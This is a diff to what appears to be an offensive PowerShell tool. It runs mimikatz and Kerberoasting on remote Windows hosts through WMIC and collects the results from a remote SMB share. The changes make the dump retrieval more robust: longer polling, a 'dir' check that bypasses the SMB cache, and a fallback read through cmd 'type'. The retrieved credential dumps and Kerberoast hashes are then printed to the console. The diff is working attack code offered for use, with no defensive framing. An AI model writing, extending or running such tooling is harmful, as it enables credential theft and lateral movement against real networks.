@@ -455,22 +455,31 @@ public class CryptoMD4 {
             cmd.exe /c $wmicCmd 2>&1 | Out-Null
             Write-Host "  [*] WMIC process launched. Waiting for dump..." -ForegroundColor White
 
-            # --- Wait for output ---
-            $maxWait = 15
+            # --- Wait for output (force SMB cache refresh) ---
+            $maxWait = 30
             $waited = 0
+            $dumpFound = $false
             while ($waited -lt $maxWait) {
-                Start-Sleep -Seconds 2
-                $waited += 2
-                if (Test-Path "$dtIdpRemote\dt_dump.log") {
-                    $logSize = (Get-Item "$dtIdpRemote\dt_dump.log").Length
-                    if ($logSize -gt 500) { break }
+                Start-Sleep -Seconds 3
+                $waited += 3
+                # Force SMB directory refresh to bust cache
+                $dirCheck = cmd.exe /c "dir `"$dtIdpRemote\dt_dump.log`" 2>nul" | Out-String
+                if ($dirCheck -match "dt_dump\.log") {
+                    $dumpFound = $true
+                    # Give mimikatz a moment to finish writing
+                    Start-Sleep -Seconds 2
+                    break
                 }
                 Write-Host "  [*] Waiting... ($waited s)" -ForegroundColor DarkGray
             }
 
             # --- Retrieve and display ---
-            if (Test-Path "$dtIdpRemote\dt_dump.log") {
-                $dumpContent = Get-Content "$dtIdpRemote\dt_dump.log" -Raw
+            if ($dumpFound -or (Test-Path "$dtIdpRemote\dt_dump.log")) {
+                $dumpContent = Get-Content "$dtIdpRemote\dt_dump.log" -Raw -ErrorAction SilentlyContinue
+                if (-not $dumpContent) {
+                    # Fallback: read via cmd to bypass PS caching
+                    $dumpContent = cmd.exe /c "type `"$dtIdpRemote\dt_dump.log`"" | Out-String
+                }
                 Write-Host
                 Write-Host "  === DT Credential Dump ===" -ForegroundColor Yellow
                 Write-Host $dumpContent -ForegroundColor Gray
@@ -574,22 +583,28 @@ try {
             cmd.exe /c $wmicCmd 2>&1 | Out-Null
             Write-Host "  [*] WMIC process launched. Waiting for results..." -ForegroundColor White
 
-            # --- Wait for output ---
-            $maxWait = 30
+            # --- Wait for output (force SMB cache refresh) ---
+            $maxWait = 45
             $waited = 0
+            $kerbFound = $false
             while ($waited -lt $maxWait) {
                 Start-Sleep -Seconds 3
                 $waited += 3
-                if (Test-Path "$dtIdpRemote\kerberoast_output.txt") {
-                    $outSize = (Get-Item "$dtIdpRemote\kerberoast_output.txt").Length
-                    if ($outSize -gt 50) { break }
+                $dirCheck = cmd.exe /c "dir `"$dtIdpRemote\kerberoast_output.txt`" 2>nul" | Out-String
+                if ($dirCheck -match "kerberoast_output\.txt") {
+                    $kerbFound = $true
+                    Start-Sleep -Seconds 2
+                    break
                 }
                 Write-Host "  [*] Waiting... ($waited s)" -ForegroundColor DarkGray
             }
 
             # --- Retrieve results ---
-            if (Test-Path "$dtIdpRemote\kerberoast_output.txt") {
-                $kerbOutput = Get-Content "$dtIdpRemote\kerberoast_output.txt" -Raw
+            if ($kerbFound -or (Test-Path "$dtIdpRemote\kerberoast_output.txt")) {
+                $kerbOutput = Get-Content "$dtIdpRemote\kerberoast_output.txt" -Raw -ErrorAction SilentlyContinue
+                if (-not $kerbOutput) {
+                    $kerbOutput = cmd.exe /c "type `"$dtIdpRemote\kerberoast_output.txt`"" | Out-String
+                }
                 Write-Host
                 Write-Host "  === Kerberoast Results ===" -ForegroundColor Yellow
                 Write-Host $kerbOutput -ForegroundColor Gray
